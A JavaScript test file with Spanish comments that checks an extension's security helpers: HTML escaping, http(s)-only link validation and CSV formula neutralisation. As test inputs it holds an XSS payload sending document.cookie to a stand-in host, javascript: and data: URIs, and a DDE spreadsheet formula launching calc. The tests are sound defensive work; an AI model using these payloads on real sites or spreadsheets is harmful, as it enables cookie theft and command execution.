import { describe, expect, it } from "vitest";
// Issue #174, revisión de Pablo — extension/seguridad.js es JS plano
// (corre como content script, sin build), pero exporta sus funciones
// con `module.exports` cuando `module` existe (ver el archivo) — eso
// alcanza para que vitest lo importe directo, sin un navegador real.
import { celdaCsv, escaparHtml, linkSeguro } from "./seguridad.js";

describe("escaparHtml — issue #174, revisión de Pablo: nunca HTML crudo de la página", () => {
  it("escapa los 5 caracteres que importan para innerHTML", () => {
    expect(escaparHtml(`<img src=x onerror=alert(1)>&'"`)).toBe("&lt;img src=x onerror=alert(1)&gt;&amp;&#39;&quot;");
  });

  it("un título real que intenta inyectar un <script> queda como texto inerte", () => {
    const tituloMalicioso = `Reloj <script>fetch('https://evil.test?c='+document.cookie)</script>`;
    const resultado = escaparHtml(tituloMalicioso);
    expect(resultado).not.toContain("<script>");
    expect(resultado).toContain("&lt;script&gt;");
  });

  it("null/undefined/vacío -> string vacío, nunca 'null' ni 'undefined' en el panel", () => {
    expect(escaparHtml(null)).toBe("");
    expect(escaparHtml(undefined)).toBe("");
    expect(escaparHtml("")).toBe("");
  });

  it("texto normal (sin caracteres especiales) queda igual", () => {
    expect(escaparHtml("Reloj digital Casio")).toBe("Reloj digital Casio");
  });
});

describe("linkSeguro — issue #174, revisión de Pablo: el Top 10 nunca usa un link que no sea http(s) real", () => {
  it("acepta http(s) real y lo normaliza con new URL", () => {
    expect(linkSeguro("https://articulo.mercadolibre.com.co/MCO-123")).toBe("https://articulo.mercadolibre.com.co/MCO-123");
    expect(linkSeguro("http://example.com/producto")).toBe("http://example.com/producto");
  });

  it("rechaza javascript:, data: y cualquier otro esquema que no sea http(s)", () => {
    expect(linkSeguro("javascript:alert(1)")).toBeNull();
    expect(linkSeguro("data:text/html,<script>alert(1)</script>")).toBeNull();
    expect(linkSeguro("ftp://example.com/x")).toBeNull();
  });

  it("un espacio antes del esquema no cuela un javascript: por el chequeo (se recorta antes de probar el patrón)", () => {
    expect(linkSeguro("  javascript:alert(1)")).toBeNull();
  });

  it("rechaza texto que no es una URL, null, undefined y un link relativo", () => {
    expect(linkSeguro("no es un link")).toBeNull();
    expect(linkSeguro(null)).toBeNull();
    expect(linkSeguro(undefined)).toBeNull();
    expect(linkSeguro("/items/MCO123")).toBeNull(); // relativo — nunca empieza con http(s)://
  });
});

describe("celdaCsv — issue #174, revisión de Pablo: Excel/Sheets nunca ejecutan una celda como fórmula", () => {
  it('ejemplo real de inyección de fórmula (DDE) que queda inerte', () => {
    expect(celdaCsv('=cmd|"/c calc"!A1')).toBe(`"'=cmd|""/c calc""!A1"`);
  });

  it("casos reales de los 5 caracteres peligrosos al inicio", () => {
    expect(celdaCsv("=1+1")).toBe(`"'=1+1"`);
    expect(celdaCsv("+1+1")).toBe(`"'+1+1"`);
    expect(celdaCsv("-50% OFF")).toBe(`"'-50% OFF"`);
    expect(celdaCsv("@mencion")).toBe(`"'@mencion"`);
    expect(celdaCsv("\tTabulado")).toBe(`"'\tTabulado"`);
  });

  it("un título real sin esos caracteres al inicio no se toca", () => {
    expect(celdaCsv("Reloj digital Casio")).toBe(`"Reloj digital Casio"`);
  });

  it("escapa comillas internas (CSV estándar) después de neutralizar la fórmula", () => {
    expect(celdaCsv('Reloj "edición especial"')).toBe(`"Reloj ""edición especial"""`);
  });

  it("null/undefined -> celda vacía entre comillas, nunca 'null'", () => {
    expect(celdaCsv(null)).toBe('""');
    expect(celdaCsv(undefined)).toBe('""');
  });

  it("un número (precio, vendidos) se convierte a texto sin romperse", () => {
    expect(celdaCsv(50000)).toBe('"50000"');
  });
});
